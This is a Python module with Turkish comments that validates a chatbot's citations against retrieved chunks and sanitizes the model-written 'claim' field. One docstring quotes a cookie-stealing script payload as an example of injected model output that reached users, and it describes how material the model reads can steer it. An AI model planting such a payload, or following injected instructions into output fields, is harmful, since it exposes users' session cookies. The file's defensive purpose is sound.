"""Atıf doğrulayıcı — "model atıf uyduramaz" iddiasının taşıyıcısı (T013).

Kontrol tek cümleyle anlatılır: cevaptaki her `chunk_id`, o istekte retrieve
edilmiş kümede olmak zorundadır. Olmayan atıf düşer; geçerli atıf kalmazsa cevap
gösterilmez.

Bu kontrolün değeri, ne yaptığında değil NASIL yaptığındadır. Modele "uydurma"
demek bir temenni, sıcaklığı düşürmek bir eğilimdir; set-membership ise
deterministik bir kapıdır. Modelin ne kadar emin göründüğü sonucu değiştirmez —
kararı Python verir, model değil.

Dosya adı ve konum da burada üretilir. Modelin yazdığı sayfa numarasını
gösterseydik, "kaynak" görünen ama uydurulmuş bir referans kullanıcıya ulaşırdı;
oysa numara `RetrievedChunk` metadata'sından gelirse uydurma yeri kalmaz
(Anayasa I).
"""

from __future__ import annotations

from collections.abc import Iterable, Sequence
from uuid import UUID

from app.contracts import (
    AnswerStatus,
    Citation,
    GeneratedAnswer,
    GuardrailVerdict,
    RetrievedChunk,
)
from app.modules.guardrails.sanitize import clean
from app.schemas.chat import LlmCitation, snippet_of

#: Kümede bulunmayan bir `chunk_id` için geçici etiket. Bu değer kullanıcıya
#: ULAŞMAZ — atıf zaten düşer. Yine de dürüst bir metin seçildi: bir gün bu
#: nesne loglara ya da hata ayıklama çıktısına düşerse "doğrulanmamış" yazması,
#: gerçek bir dosya adı taklidi etmesinden iyidir.
UNVERIFIED_SOURCE_LABEL = "Doğrulanmamış kaynak"

BLOCK_REASON_NO_VALID_CITATION = "no_valid_citation"


def build_citations(
    llm_citations: Sequence[LlmCitation],
    chunks: Sequence[RetrievedChunk],
) -> tuple[list[Citation], dict[UUID, str]]:
    """Model atıflarını, metadata'dan doldurulmuş `Citation` nesnelerine çevirir.

    Uydurma kimlikler burada ELENMEZ, sahte metadata ile taşınır ve elenmeleri
    `CitationGuardrail`'e bırakılır. Bunun sebebi ölçülebilirliktir (Anayasa III):
    düşen atıf tek bir yerde sayılırsa "model atıf uyduramaz" iddiası bir rakama
    dayanır; iki ayrı yerde sessizce elenirse iddia kanıtsız kalır.

    Aynı kaynağa birden çok atıf tekilleştirilir — kullanıcıya aynı sayfayı üç
    kez göstermek bilgi değil gürültüdür.

    **`claim` burada temizlenir.** Bu alan atıf kartında görünen ve **tamamen
    modelin yazdığı** tek metindir; guardrail zinciri ona hiç dokunmuyordu, çünkü
    hiçbir karar ona bakmıyor ve sözleşmede (`contracts.Citation`) bile yok.
    Sonuç, sanitize'ın kapsamadığı bir ekran yüzeyiydi: ölçüldü, modelin
    `claim` alanına yazdığı `<script>fetch('//x/'+document.cookie)</script>`
    zarfa olduğu gibi çıkıyordu.

    Enjeksiyon savunmasının varlık sebebi tam olarak "materyal modele talimat
    verebilir"dir; o talimatın en kolay hedefi, kimsenin denetlemediği bir çıktı
    alanıdır. Temizlik zincirde değil BURADA, çünkü zincir bu alanı hiç görmüyor
    ve görmesi için sözleşmenin değişmesi gerekir (lider dosyası). Kaynağında
    temizlemek, alanın taşındığı üç yolun (zarf, `chat_messages` kaydı, sonraki
    geçmiş okumaları) hepsini birden kapatır.
    """
    by_id = {chunk.chunk_id: chunk for chunk in chunks}
    citations: list[Citation] = []
    claims: dict[UUID, str] = {}
    seen: set[UUID] = set()

    for item in llm_citations:
        if item.chunk_id in seen:
            continue
        seen.add(item.chunk_id)
        claim = clean(item.claim).strip()
        if claim:
            claims[item.chunk_id] = claim

        chunk = by_id.get(item.chunk_id)
        if chunk is None:
            citations.append(
                Citation(
                    chunk_id=item.chunk_id,
                    file_name=UNVERIFIED_SOURCE_LABEL,
                    location="",
                    quote="",
                )
            )
            continue
        citations.append(
            Citation(
                chunk_id=chunk.chunk_id,
                file_name=chunk.file_name,
                location=chunk.location,
                quote=snippet_of(chunk),
            )
        )
    return citations, claims


class CitationGuardrail:
    """`Guardrail` protokolünü uygular. Zincirin ilk halkası."""

    def check(self, answer: GeneratedAnswer, retrieved: list[RetrievedChunk]) -> GuardrailVerdict:
        allowed = {chunk.chunk_id for chunk in retrieved}
        dropped = [c.chunk_id for c in answer.citations if c.chunk_id not in allowed]
        kept = [c for c in answer.citations if c.chunk_id in allowed]

        # Abstention'ın atıfa ihtiyacı yoktur: "kaynak bulamadım" demek için
        # kaynak göstermek gerekmez. Burayı ayırmazsak her ret bloklanır ve
        # kullanıcı hiçbir açıklama görmez (Anayasa VII: ret hata değildir).
        if answer.status is not AnswerStatus.ANSWERED:
            return GuardrailVerdict(blocked=False, dropped_citations=dropped)

        if not kept:
            return GuardrailVerdict(
                blocked=True,
                reason=BLOCK_REASON_NO_VALID_CITATION,
                dropped_citations=dropped,
            )
        return GuardrailVerdict(blocked=False, dropped_citations=dropped)


def drop_invalid(citations: Iterable[Citation], dropped: Iterable[UUID]) -> list[Citation]:
    """Verdict'te düşen atıfları listeden çıkarır.

    Ayrı bir fonksiyon çünkü `check` bilinçli olarak SAF: girdisini değiştirmez.
    Yan etkili bir doğrulayıcı, test edilirken doğruladığı nesneyi bozar ve bir
    sonraki halka neyi denetlediğini bilemez.
    """
    dropped_set = set(dropped)
    return [c for c in citations if c.chunk_id not in dropped_set]
